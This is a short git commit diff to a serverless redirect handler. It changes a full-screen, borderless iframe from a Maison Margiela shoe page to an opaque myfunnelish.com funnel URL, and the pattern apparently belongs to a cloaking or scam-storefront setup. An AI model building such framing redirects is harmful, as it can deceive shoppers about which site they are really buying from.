6699c268ff0a743fbf1017204b55dccbc5f8b654
rmeeesumraza <github@snobay.com>
2025-01-15 15:16:51 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -13,7 +13,7 @@ export default function handler(req, res) {
     var whLP = `
     <html>
         <body>
-            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://www.maisonmargiela.com/en-us/maison-margiela/men/shoes/"></iframe>
+            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
         </body>
     </html>
     `;
